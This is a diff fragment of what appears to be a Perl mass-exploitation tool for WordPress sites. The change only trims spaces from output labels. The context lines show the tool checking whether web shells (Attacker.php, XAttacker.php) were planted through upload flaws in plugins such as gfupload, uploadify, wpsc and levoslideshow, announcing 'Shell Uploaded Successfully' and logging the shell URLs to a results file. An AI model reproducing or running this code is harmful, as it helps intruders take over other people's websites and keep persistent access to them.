@@ -270,7 +270,7 @@ $addblockup="$site/wp-content/Attacker.php?X=Attacker";
 my $checkaddblock = $ua->get("$addblockup")->content;
 
 if($checkaddblock =~/X Attacker/) {
-print item(),"    gfupload";
+print item(),"gfupload";
 print color('bold white')," ................... ";
 print color('bold green'),"VULN\n";
 print item(),"Shell Uploaded Successfully\n";
@@ -279,7 +279,7 @@ open (TEXT, '>>Result/Shells.txt');
 print TEXT "$addblockup\n";
 close (TEXT);
 }else{
-print item(),"   gfupload";
+print item(),"gfupload";
 print color('bold white')," ................... ";
 print color('bold red'),"NOt VULN\n";
 }
@@ -292,7 +292,7 @@ $addblockup="$site/wp-content/uploads/Attacker.php?X=Attacker";
 my $checkaddblock = $ua->get("$addblockup")->content;
 
 if($checkaddblock =~/X Attacker/) {
-print item(),"   uploadify";
+print item(),"uploadify";
 print color('bold white')," ................... ";
 print color('bold green'),"VULN\n";
 print item(),"Shell Uploaded Successfully\n";
@@ -301,7 +301,7 @@ open (TEXT, '>>Result/Shells.txt');
 print TEXT "$addblockup\n";
 close (TEXT);
 }else{
-print item(),"   uploadify";
+print item(),"uploadify";
 print color('bold white')," ................... ";
 print color('bold red'),"NOt VULN\n";
 }
@@ -314,7 +314,7 @@ $addblockup="$site/wp-content/uploads/wpsc/XAttacker.php?X=Attacker";
 my $checkaddblock = $ua->get("$addblockup")->content;
 
 if($checkaddblock =~/X Attacker/) {
-print item(),"   wpsc";
+print item(),"wpsc";
 print color('bold white')," ................... ";
 print color('bold green'),"VULN\n";
 print item(),"Shell Uploaded Successfully\n";
@@ -323,7 +323,7 @@ open (TEXT, '>>Result/Shells.txt');
 print TEXT "$addblockup\n";
 close (TEXT);
 }else{
-print item(),"   wpsc";
+print item(),"wpsc";
 print color('bold white')," ................... ";
 print color('bold red'),"NOt VULN\n";
 }
@@ -337,7 +337,7 @@ $addblockup="$site/wp-content/uploads/levoslideshow/XAttacker.php?X=Attacker";
 my $checkaddblock = $ua->get("$addblockup")->content;
 
 if($checkaddblock =~/X Attacker/) {
-print item(),"   swfupload ";
+print item(),"swfupload ";
 print color('bold white')," ................... ";
 print color('bold green'),"VULN\n";
 print item(),"Shell Uploaded Successfully\n";
